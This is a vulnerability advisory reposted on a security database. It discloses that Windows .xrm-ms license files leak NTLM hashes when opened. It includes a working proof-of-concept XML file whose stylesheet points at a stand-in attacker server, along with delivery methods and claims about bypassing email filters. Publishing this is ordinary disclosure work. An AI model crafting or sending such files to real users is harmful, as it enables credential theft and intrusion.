---
title: Microsoft Windows .XRM-MS File / NTLM Hash Disclosure (Spoofing)
url: https://cxsecurity.com/issue/WLB-2025050004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-02
fetch_date: 2025-10-06T22:27:16.141339
---

# Microsoft Windows .XRM-MS File / NTLM Hash Disclosure (Spoofing)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft Windows .XRM-MS File / NTLM Hash Disclosure (Spoofing)** **2025.05.01**  Credit:  **[hyp3rlinx](https://cxsecurity.com/author/hyp3rlinx/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: https://hyp3rlinx.altervista.org/advisories/Microsoft\_Windows\_xrm-ms\_File\_NTLM-Hash\_Disclosure.txt
[+] x.com/hyp3rlinx
[+] ISR: ApparitionSec
[Vendor]
www.microsoft.com
[Product]
.xrm-ms File Type
[Vulnerability Type]
NTLM Hash Disclosure (Spoofing)
[Video URL PoC]
https://www.youtube.com/watch?v=d5U\_krLQbNY
[CVE Reference]
N/A
[Security Issue]
The Windows XRM-MS file type is related to Microsofts software licensing infrastructure.
C:\> assoc .xrm-ms=MSSppLicenseFile.
An "xrm-ms" digital license file opens default (times a tickin) in Internet Explorer (MSIE) and on later OS versions switches to MS Edge.
The ".xrm-ms" file format allows injecting XML stylesheets that will then get processed, when a user opens it.
Adversaries can reference UNC paths for the stylesheet HREF tag that points to LAN network share or attacker controlled infrastructure.
This results in an outbound connection to the attacker controlled network share and or server, leaking the target NTLM hash.
Works from both a LAN network share perspective or remote forced drive-by download to a target etc. User interaction is required to open the file.
During testing, xrm-ms file type not blocked by Windows Office Outlook client 2016 and a popular Email Gateway Security product as of few days ago.
Xrm-Ms File points:
1) XRM-MS is not considered dangerous file type
2) Defaults to open in either MSIE or Edge Win7/10/11/Server 2019
3) Default Icon as it is Windows browser may make it appear more "trust-worthy"
4) Throws no errors from the stylesheet directive when processed
5) May bypass some inbound email security inspections
6) No MOTW roadblocks
7) No active content security warnings
Tested successfully in Win7/Win10/Server 2019
Mileage may vary on Windows 11 and or recently updated systems.
[Exploit/POC]
Delivery options:
Drive-by force download
Email
Network Share
Archive .zip etc
1) Create .xrm-ms File with following content, adjust attacker server information. Actually, all you need is the one XML stylesheet to trigger it.
<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet href="\\ATTACKER-SERVER\NTLMhashLeakDontMeetMSRCBarPoC" ?>
<r:license xmlns:r="http://www.microsoft.com/DRM/rightsManager">
<r:licenseID>12345-67890-ABCDE</r:licenseID>
<r:productName>Windows(R) Operating System, VOLUME\_KMSCLIENT channel</r:productName>
<r:productKeyID>XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</r:productKeyID>
<r:hardwareBinding>
<r:hash>AA11BB22CC33DD44EE55</r:hash>
</r:hardwareBinding>
<r:validity>
<r:validFrom>2024-01-01T00:00:00</r:validFrom>
<r:validUntil>2025-01-01T00:00:00</r:validUntil>
</r:validity>
<r:signature>...</r:signature>
</r:license>
[Network Access]
Remote
[Severity]
Medium
[Disclosure Timeline]
Vendor Notification: April 17, 2025
MSRC response: "report is a moderate spoofing and doesn't meet the bar." April 29, 2025
April 30, 2025 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content copyright (c).
hyp3rlinx

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top